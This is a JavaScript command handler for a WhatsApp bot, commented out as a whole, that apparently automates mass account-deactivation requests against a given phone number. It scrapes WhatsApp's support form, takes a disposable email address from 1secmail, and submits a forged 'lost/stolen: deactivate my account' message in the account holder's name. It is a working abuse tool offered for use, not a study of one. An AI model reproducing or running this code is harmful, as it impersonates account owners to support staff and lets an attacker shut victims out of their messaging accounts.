/* //import cheerio from 'cheerio';
import axios from 'axios';
import util from 'util';

let handler = async (context, { conn, isOwner, usedPrefix, command, args }) => {
    const userInput = args.join(' ');
    if (!userInput || !args[0]) {
        throw "Please provide valid input.";
    }

    // Fetch data from WhatsApp contact pages
    let whatsappContactPage = await axios.get('https://www.whatsapp.com/contact/noclient/');
    let whatsappSupportAPI = await axios.get('https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10');
    
    let cookies = whatsappContactPage.headers['set-cookie'].join('; ');
    let $ = cheerio.load(whatsappContactPage.data);
    
    let formAction = $('form').attr('action');
    let formURL = new URL(formAction, 'https://www.whatsapp.com').href;
    
    // Prepare form data for submission
    let formData = new URLSearchParams();
    formData.append('jazoest', $('input[name=jazoest]').val());
    formData.append('lsd', $('input[name=lsd]').val());
    formData.append('step', 'submit');
    formData.append('country_selector', 'ID');
    formData.append('phone_number', userInput);
    formData.append('email', whatsappSupportAPI.data[0]);
    formData.append('platform', 'ANDROID');
    formData.append('your_message', `Lost/stolen: deactivate my account: ${userInput}`);
    formData.append('__a', '1');
    formData.append('__csr', '');
    formData.append('__req', '8');
    formData.append('__hs', '1');
    formData.append('__rev', '1006630858');
    formData.append('__comment_req', 'UNKNOWN');
    formData.append('__user', '0');

    // Send form data to WhatsApp
    let response = await axios({
        url: formURL,
        method: 'POST',
        data: formData,
        headers: {
            'cookie': cookies
        }
    });

    let responseBody = String(response.data);
    
    // Handle responses
    if (responseBody.includes('Thank you for your message')) {
        context.reply("Message successfully sent to WhatsApp Support.");
    } else if (responseBody.includes('We have deactivated your WhatsApp account')) {
        context.reply("WhatsApp account deactivation request sent successfully.");
    } else {
        context.reply(util.inspect(JSON.parse(responseBody.replace('for (;;);', ''))));
    }
};

// Regular expression to match valid commands
handler.command = /^(supportwa|swa|logout|support|deactivatewa|mandsupport)$/i;
handler.owner = true;
handler.tag = ['owner'];
handler.help = ['logout'];

export default handler;
 */